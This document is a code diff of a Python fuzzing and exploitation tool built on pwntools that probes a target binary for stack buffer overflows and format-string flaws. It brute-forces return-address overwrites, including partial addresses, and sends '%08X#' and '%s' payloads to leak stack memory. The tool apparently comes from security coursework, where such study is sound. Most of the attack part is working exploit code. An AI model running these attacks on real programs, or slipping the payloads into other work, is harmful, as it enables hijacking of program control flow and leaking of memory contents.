@@ -17,6 +17,7 @@ from fuzzingbook.MutationFuzzer import MutationFuzzer
 from fuzzingbook.SearchBasedFuzzer import mutate
 from pwn import *
 from pwnlib import *
+from pwn import p32
 import difflib
 
 
@@ -34,17 +35,13 @@ def cmd_line_call(name, args):
     return (out, returncode)
 
 
-def findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations, inputFromFile,detailedLog):
-    #f = RandomFuzzer()
-
-    #inp = seedInput
+def findMinBadLen(fuzzFile, fuzzedProgram, mutations, inputFromFile,detailedLog):
     minBadLen = sys.maxsize
     lenToReachReturnAddr = sys.maxsize
     inp = ""
     broken=0
     if inputFromFile:
         for i in range(1,mutations):
-            # inp = mutate(inp)
             inp = inp + 'A'
             currLen = len(inp)
             # create files and keep feeding them into the system
@@ -88,15 +85,6 @@ def findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations, inputFromFile,d
                     break
     print(f"The minimum bad len input that was found is {minBadLen}")
     return lenToReachReturnAddr
-
-
-def test():
-    mutations=5
-    inp=""
-    for i in range(mutations,0,-1):
-        possinsionForS=mutations-i
-        inp=possinsionForS*"%x"+"%s"+(mutations-possinsionForS-1)*"%x"
-        print(inp)
 
 
 def attackSystem(lenToReachReturnAddr, fuzzedProgram, fuzzFile, attackAddress,inputFromFile, detailedLog):
@@ -198,14 +186,14 @@ def convertAddressToString(addr):
 def attackWithPartialAddress(lenToReachReturnAddr, partialAddress, fuzzedProgram, fuzzFile, inputFromFile,detailedLog):
 
     # build the address
-    partialAddressLen = len(str(partialAddress))
+    partialAddressLen = len(partialAddress)
     unknownBytesNr = 4 - partialAddressLen
     possibleAddresses= pow(256,unknownBytesNr)
     validAddresses=[b'0']
     if inputFromFile :
         for i in range(possibleAddresses.__round__()):
             file = open(fuzzFile, 'wb')
-            attackAddress = i.to_bytes(unknownBytesNr, 'big') + partialAddress.encode(encoding="latin")
+            attackAddress = i.to_bytes(unknownBytesNr, 'big') + partialAddress
             # build the attack
             attackLen = (lenToReachReturnAddr + 4).to_bytes(4, 'big')
             inp = b'A' * lenToReachReturnAddr
@@ -263,10 +251,18 @@ def sigFaultAddr():
     return hex(c.fault_addr)
 
 #Check for format string
-def checkForFormatString(fuzzedProgram,formatParameter,detailedLog):
+def checkForFormatString(fuzzedProgram,formatParameter,fuzzFile,inputFromFile,detailedLog):
     inp=""+formatParameter
+    if inputFromFile:
+        file = open(fuzzFile, 'wb')
+        attackString=inp.encode('ascii')
+        file.write(attackString)
+        file.close()
     try:
-        output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
+        if inputFromFile:
+            output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
+        else:
+            output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
         if detailedLog:
             print(f"The output for checking if there is a format string using {formatParameter}")
             print(output.stdout)
@@ -279,31 +275,46 @@ def checkForFormatString(fuzzedProgram,formatParameter,detailedLog):
 
 
 #How many characters could the input buffer take
-def maxLengthOfTheFormatString(fuzzedProgram,detailedLog):
+def maxLengthOfTheFormatString(fuzzedProgram,fuzzFile,inputFromFile,detailedLog):
     inp="A"
     i=1
     gb=10_000_000_000
+        
     while i<gb:
         inp='A'*i
+        if inputFromFile:
+            file = open(fuzzFile, 'wb')
+            attackString=inp.encode('ascii')
+            file.write(attackString)
+            file.close()
         try:
-            subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
+            if inputFromFile:
+                subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
+            else:
+                subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
         except subprocess.CalledProcessError:
             break
         except OSError:
                 break
         i=i*10
     if detailedLog:
-        print(f"The attack file size can be at least {int(i/10)} characters in size")
+        print(f"The attack string size can be at least {int(i/10)} characters in size")
     return i
 
 
-def howManyFormatParameters(fuzzedProgram,formatParameter,mutations,maxLen,detailedLog):
+#How long can the input be only unsing format string parameters
+def howManyFormatParameters(fuzzedProgram,formatParameter,mutations,maxLen,fuzzFile ,inputFromFile, detailedLog):
     inp=formatParameter
-    output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
     for i in range (1,mutations):
-        inp=inp+formatParameter
-        output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
-        # print(output.stdout)
+        if inputFromFile:
+            file = open(fuzzFile, 'wb')
+            attackString=inp.encode('ascii')
+            file.write(attackString)
+            file.close()
+            output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, errors='ignore')
+        else:
+            output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
+            
         if output.returncode==-11:
             # it must be i/len(formatParameter) since "%" and "s" whould count as two different characters
             if int(i/len(formatParameter))< maxLen:
@@ -314,7 +325,8 @@ def howManyFormatParameters(fuzzedProgram,formatParameter,mutations,maxLen,detai
             else:
                 if detailedLog:
                     print("The program crashed from diffrent reasons other than format string")
-                return 0
+                return 0  
+        inp=inp+formatParameter
     #count how many times did the '#' character appear in stdout to check if all of the format parameters were consumed by the program
     count=0
     for i in output.stdout:
@@ -330,15 +342,22 @@ def howManyFormatParameters(fuzzedProgram,formatParameter,mutations,maxLen,detai
     return mutations
 
 
-def mapMemory(fuzzedProgram,mutations,detailedLog):
+#Try to map the memory using %s at different possitions on the stack for memory leaking purposes
+def mapMemory(fuzzedProgram,formatParameter,mutations,fuzzFile,inputFromFile,detailedLog,showFails):
     inp=""
-    showFails=False
     possitionsOfValidAddresses=[]
     stringValueOfValidAddress=[]
     byteValueOfValidAddress=[]
     for i in range(0,mutations):
-        inp=i*"%08X#"+"%s#"
-        output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
+        inp=i*formatParameter+"%s#"
+        if inputFromFile:
+            file = open(fuzzFile, 'wb')
+            attackString=inp.encode('ascii')
+            file.write(attackString)
+            file.close()
+            output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, errors='ignore')
+        else:
+            output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
         if output.returncode!=-11:
             #the program did not end in a segmentation fault
             if detailedLog:
@@ -347,11 +366,19 @@ def mapMemory(fuzzedProgram,mutations,detailedLog):
                 print("Output using \"%s\":")
                 print(output.stdout)
             possitionsOfValidAddresses.append(i)
-            inp=(i+1)*"%08X#"
-            outputx = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
+            inp=(i+1)*formatParameter
+            if inputFromFile:
+                file = open(fuzzFile, 'wb')
+                attackString=inp.encode('ascii')
+                file.write(attackString)
+                file.close()
+                outputx = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
+            else:
+                outputx = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
+            
             if detailedLog:
                 print(f"The input string is: {inp}")
-                print("Output using only \"%08X#\":")
+                print(f"Output using only \"{formatParameter}\":")
                 print(outputx.stdout)
             #extract the last byte and its value from the output
             stringV=output.stdout[(i+1)*9:]
@@ -369,7 +396,12 @@ def mapMemory(fuzzedProgram,mutations,detailedLog):
                 print("Program ended with a segmentation fault")
                 print(f"\n**************{i}**************\n")
     return possitionsOfValidAddresses,stringValueOfValidAddress
-            
+         
+         
+def test():
+    partialAddress=0x800012
+    littleEndian=p32(partialAddress, endian='little')
+    print(littleEndian)   
         
 
 # Press the green button in the gutter to run the script.
@@ -397,6 +429,12 @@ if __name__ == '__main__':
     attackAddress=int(line[line.index("=") +1],base=16)
     
     line = f.readline().split()
+    partialAttackAddress=int(line[line.index("=") +1],base=16)
+    
+    line = f.readline().split()
+    missingBytes=int(line[line.index("=") +1])
+    
+    line = f.readline().split()
     mutations=int(line[line.index("=") +1])
     
     inputFromFile=False
@@ -413,35 +451,51 @@ if __name__ == '__main__':
     line = f.readline().split()
     if line[line.index("=") +1] == 'True':
         detailedLog=True   
+        
+    showFails=False
+    line = f.readline().split()
+    if line[line.index("=") +1] == 'True':
+        showFails=True  
     #Set variables for the fuzzed program
-    seedInput = "abcdefghijklmno"
     littleEndian=p32(attackAddress, endian='little')
+    littleEndianPartial=p32(partialAttackAddress, endian='little')
+    partial = littleEndianPartial[:4-missingBytes] + littleEndianPartial[4+missingBytes:]
     sys.stdout = open('log.txt', 'w')
     
+    #test()
     
     if(checkForBufferOverflow):
-        lenToReachReturnAddr = findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations,inputFromFile,detailedLog)
+        lenToReachReturnAddr = findMinBadLen(fuzzFile, fuzzedProgram, mutations,inputFromFile,detailedLog)
         if lenToReachReturnAddr==sys.maxsize:
             print("The bufferoverflow was not reached or recheck if the parameters are the rigth ones")
         else:
             attackSystem(lenToReachReturnAddr,fuzzedProgram,fuzzFile,littleEndian,inputFromFile,detailedLog)
-            validAddresses=attackWithPartialAddress(lenToReachReturnAddr,'\x91\x04\x08', fuzzedProgram,fuzzFile,inputFromFile,detailedLog)
+            validAddresses=attackWithPartialAddress(lenToReachReturnAddr,partial, fuzzedProgram,fuzzFile,inputFromFile,detailedLog)
             print(f"A total {len(validAddresses)} of valid addresses that deflect the program:")
             print(validAddresses)
             breakSystemBeforeReturn(lenToReachReturnAddr, fuzzedProgram, fuzzFile, inputFromFile,detailedLog)
     else:
         formatParameter="%08X#"
-        if checkForFormatString(fuzzedProgram,formatParameter,detailedLog):
+        if checkForFormatString(fuzzedProgram,formatParameter,fuzzFile,inputFromFile,detailedLog):
             print("The program contains the format string vulnerability")
-        maxLen=maxLengthOfTheFormatString(fuzzedProgram,detailedLog)
-        lenOfString=howManyFormatParameters(fuzzedProgram,formatParameter,mutations,maxLen,detailedLog)
-        if lenOfString!=0:
-            possitionsOfValidAddresses,stringValueOfValidAddress=mapMemory(fuzzedProgram,lenOfString,detailedLog)
-            print(f"There are {len(possitionsOfValidAddresses)} bytes that contain a valid address after trying {mutations} mutations:")
-            print("They represent the relative position from the beginning of the stack of the fuzzed program:")
-            print("Offset \t \t Value")
-            for i in range(len(possitionsOfValidAddresses)):
-                print(f"{possitionsOfValidAddresses[i]} \t \t \t {stringValueOfValidAddress[i]}\n")
+            maxLen=maxLengthOfTheFormatString(fuzzedProgram,fuzzFile,inputFromFile,detailedLog)
+            lenOfString=howManyFormatParameters(fuzzedProgram,formatParameter,mutations,maxLen,fuzzFile,inputFromFile,detailedLog)
+            if lenOfString!=0:
+                possitionsOfValidAddresses,stringValueOfValidAddress=mapMemory(fuzzedProgram,formatParameter,lenOfString,fuzzFile,
+                                                                               inputFromFile,detailedLog,showFails)
+                print(f"There are {len(possitionsOfValidAddresses)} bytes that contain a valid address after trying {mutations} mutations:")
+                print("They represent the relative position from the beginning of the stack of the fuzzed program:")
+                print("Offset \t \t Value")
+                possibleReturnAdr=[]
+                for i in range(len(possitionsOfValidAddresses)):
+                    if stringValueOfValidAddress[i].isascii() and stringValueOfValidAddress[i]!="":
+                        possibleReturnAdr.append(possitionsOfValidAddresses[i])           
+                    print(f"{possitionsOfValidAddresses[i]} \t \t \t {stringValueOfValidAddress[i]}\n")
+                print(f"There are {len(possibleReturnAdr)} addresses were the Return address could reside in:")
+                print(possibleReturnAdr)
+        else:
+            print("The program does NOT contain the format string vulnerability")
+            
         
     sys.stdout.close()
 
